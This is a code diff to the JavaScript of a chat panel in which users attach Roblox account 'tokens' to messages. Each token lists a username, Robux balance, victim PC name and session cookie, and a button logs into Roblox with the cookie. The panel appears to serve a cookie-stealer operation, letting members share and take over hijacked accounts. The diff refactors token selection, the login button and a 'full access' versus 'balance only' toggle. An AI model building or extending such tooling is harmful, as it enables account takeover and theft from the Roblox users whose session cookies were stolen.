@@ -6,6 +6,7 @@ bindLogout();
 
 let chatMessages = [];
 let userTokens = [];
+let pickerFilteredTokens = [];
 let attachedToken = null;
 let attachedImageBase64 = null;
 let isSending = false;
@@ -76,9 +77,7 @@ function renderChatMessages(autoScroll = true) {
 
       if (tc.hasAccess && tc.security) {
         accessBadgeHtml = `<span class="chat-card-badge-access">Полный доступ</span>`;
-        const tokenEscaped = escapeHtml(tc.security).replace(/'/g, "\\'");
-        const fileEscaped = escapeHtml(tc.file || '').replace(/'/g, "\\'");
-        loginBtnHtml = `<button class="btn-login btn-sm" style="padding: 0.4rem 0.9rem; font-size: 0.85rem;" onclick="loginFromChat('${tokenEscaped}', this, '${fileEscaped}')">Войти</button>`;
+        loginBtnHtml = `<button class="btn-login btn-sm" style="padding: 0.4rem 0.95rem; font-size: 0.88rem;" onclick="loginFromChatMsg('${msg.id}', this)">Войти</button>`;
       }
 
       tokenCardHtml = `
@@ -103,7 +102,7 @@ function renderChatMessages(autoScroll = true) {
     if (msg.image) {
       imageHtml = `
         <div class="chat-msg-image-wrap">
-          <img src="${msg.image}" class="chat-msg-image" alt="attachment" onclick="openImageViewer('${msg.image}')">
+          <img src="${msg.image}" class="chat-msg-image" alt="image" onclick="openImageViewer(this.src)">
         </div>
       `;
     }
@@ -131,9 +130,17 @@ function renderChatMessages(autoScroll = true) {
   }
 }
 
-// ── Вход в Roblox из карточки в чате ──────────────────────────────────────────
-function loginFromChat(token, btn, fileId) {
-  if (!token) return;
+// ── Вход в Roblox из карточки сообщения ───────────────────────────────────────
+function loginFromChatMsg(msgId, btn) {
+  const msg = chatMessages.find(m => m.id === msgId);
+  if (!msg || !msg.tokenCard || !msg.tokenCard.security) {
+    toast('Токен недоступен для входа', 'err');
+    return;
+  }
+
+  const token = msg.tokenCard.security;
+  const fileId = msg.tokenCard.file;
+
   btn.textContent = 'Вход...';
   btn.disabled = true;
 
@@ -213,7 +220,8 @@ async function sendMessage() {
       detachImage();
       await loadChatMessages(true);
     } else {
-      toast('Ошибка отправки сообщения', 'err');
+      const err = await resp.json().catch(()=>({}));
+      toast(err.error || 'Ошибка отправки сообщения', 'err');
     }
   } catch (e) {
     if (e.message !== 'auth') toast('Ошибка соединения', 'err');
@@ -235,7 +243,7 @@ function processImageFile(file) {
   reader.onload = function(e) {
     const img = new Image();
     img.onload = function() {
-      const maxDim = 1200;
+      const maxDim = 1000;
       let w = img.width;
       let h = img.height;
       if (w > maxDim || h > maxDim) {
@@ -254,14 +262,15 @@ function processImageFile(file) {
       const ctx = canvas.getContext('2d');
       ctx.drawImage(img, 0, 0, w, h);
 
-      attachedImageBase64 = canvas.toDataURL('image/jpeg', 0.85);
+      // Сжимаем в JPEG 0.8 для гарантированного прохождения лимита payload
+      attachedImageBase64 = canvas.toDataURL('image/jpeg', 0.8);
 
       const previewBox = document.getElementById('attachedImagePreview');
       const previewThumb = document.getElementById('attachedImageThumb');
       const previewName = document.getElementById('attachedImageName');
 
       if (previewThumb) previewThumb.src = attachedImageBase64;
-      if (previewName) previewName.textContent = file.name || 'Изображение (' + Math.round(attachedImageBase64.length / 1024) + ' KB)';
+      if (previewName) previewName.textContent = file.name || 'Изображение прикреплено';
       if (previewBox) previewBox.style.display = 'flex';
 
       document.getElementById('chatInput')?.focus();
@@ -290,7 +299,7 @@ document.getElementById('chatFileInput')?.addEventListener('change', function() 
 });
 
 // Поддержка Ctrl+V вставки картинок
-document.getElementById('chatInput')?.addEventListener('paste', function(e) {
+document.addEventListener('paste', function(e) {
   if (e.clipboardData && e.clipboardData.items) {
     const items = e.clipboardData.items;
     for (let i = 0; i < items.length; i++) {
@@ -344,7 +353,7 @@ function closeImageViewer() {
   if (modal) modal.classList.remove('active');
 }
 
-// ── Выбор токена для прикрепления (Поиск, Сортировка, Доступ) ───────────────────
+// ── Выбор токена для прикрепления ─────────────────────────────────────────────
 document.getElementById('btnOpenTokenPicker')?.addEventListener('click', async () => {
   const modal = document.getElementById('tokenPickerModal');
   const listEl = document.getElementById('tokenPickerList');
@@ -394,29 +403,21 @@ function renderTokenPickerList() {
     list.sort((a, b) => new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0));
   }
 
+  pickerFilteredTokens = list;
+
   if (!list.length) {
     listEl.innerHTML = '<div class="empty" style="padding:1.5rem;">Токены не найдены</div>';
     return;
   }
 
   let html = '';
-  list.forEach(t => {
+  list.forEach((t, idx) => {
     const username = escapeHtml(t.username || t.user || 'Roblox User');
     const robux = (t.robux !== undefined && t.robux !== null) ? Number(t.robux).toLocaleString() + ' R$' : '0 R$';
     const pc = escapeHtml(t.computer || '—');
 
-    const rawId = t.file || t.userId || username;
-    const tokenSerialized = escapeHtml(JSON.stringify({
-      username: t.username || t.user,
-      userId: t.userId,
-      robux: t.robux,
-      computer: t.computer,
-      security: t.security,
-      file: t.file
-    })).replace(/'/g, "\\'");
-
     html += `
-      <div class="token-picker-item" onclick="attachTokenFromData('${tokenSerialized}')">
+      <div class="token-picker-item" onclick="selectTokenByIndex(${idx})">
         <div style="display:flex; flex-direction:column; gap:2px; min-width:0;">
           <div style="font-weight:700; color:#fff; font-size:0.92rem;">${username}</div>
           <div style="font-size:0.78rem; color:var(--text-muted);">ПК: ${pc}</div>
@@ -429,31 +430,58 @@ function renderTokenPickerList() {
   listEl.innerHTML = html;
 }
 
-function attachTokenFromData(jsonStr) {
-  try {
-    const t = JSON.parse(jsonStr);
-    const hasAccess = document.getElementById('chkGrantFullAccess')?.checked || false;
-    attachedToken = {
-      ...t,
-      hasAccess: hasAccess
-    };
+function selectTokenByIndex(idx) {
+  const t = pickerFilteredTokens[idx];
+  if (!t) return;
 
-    const previewBox = document.getElementById('attachedTokenPreview');
-    const previewText = document.getElementById('attachedTokenText');
-    const accessBadge = document.getElementById('attachedTokenAccessBadge');
-    const username = t.username || 'Roblox User';
-    const robux = (t.robux !== undefined && t.robux !== null) ? Number(t.robux).toLocaleString() + ' R$' : '0 R$';
+  const hasAccess = document.getElementById('chkGrantFullAccess')?.checked || false;
+  attachedToken = {
+    username: t.username || t.user || 'Roblox User',
+    userId: t.userId || null,
+    robux: Number(t.robux) || 0,
+    computer: t.computer || '—',
+    security: t.security || null,
+    file: t.file || null,
+    hasAccess: hasAccess
+  };
 
-    if (previewText) previewText.textContent = `${username} (${robux})`;
-    if (accessBadge) {
-      accessBadge.textContent = hasAccess ? 'Полный доступ (кнопка Войти)' : 'Только баланс';
-      accessBadge.className = hasAccess ? 'token-access-pill is-full' : 'token-access-pill';
+  updateAttachedTokenPreview();
+  closeTokenPicker();
+  document.getElementById('chatInput')?.focus();
+}
+
+function updateAttachedTokenPreview() {
+  const previewBox = document.getElementById('attachedTokenPreview');
+  const previewText = document.getElementById('attachedTokenText');
+  const accessBtn = document.getElementById('btnToggleAttachedAccess');
+
+  if (!attachedToken) {
+    if (previewBox) previewBox.style.display = 'none';
+    return;
+  }
+
+  const username = attachedToken.username || 'Roblox User';
+  const robux = Number(attachedToken.robux) || 0;
+  const robuxStr = robux > 0 ? robux.toLocaleString() + ' R$' : '0 R$';
+
+  if (previewText) previewText.textContent = `${username} (${robuxStr})`;
+  if (accessBtn) {
+    if (attachedToken.hasAccess) {
+      accessBtn.textContent = 'Доступ: Включен (кнопка Войти)';
+      accessBtn.className = 'btn-toggle-access is-full';
+    } else {
+      accessBtn.textContent = 'Доступ: Только баланс';
+      accessBtn.className = 'btn-toggle-access';
     }
-    if (previewBox) previewBox.style.display = 'flex';
+  }
+  if (previewBox) previewBox.style.display = 'flex';
+}
 
-    closeTokenPicker();
-    document.getElementById('chatInput')?.focus();
-  } catch (e) {}
+function toggleAttachedAccess() {
+  if (!attachedToken) return;
+  attachedToken.hasAccess = !attachedToken.hasAccess;
+  updateAttachedTokenPreview();
+  toast(attachedToken.hasAccess ? 'Полный доступ включен' : 'Установлен режим только баланса');
 }
 
 function detachToken() {
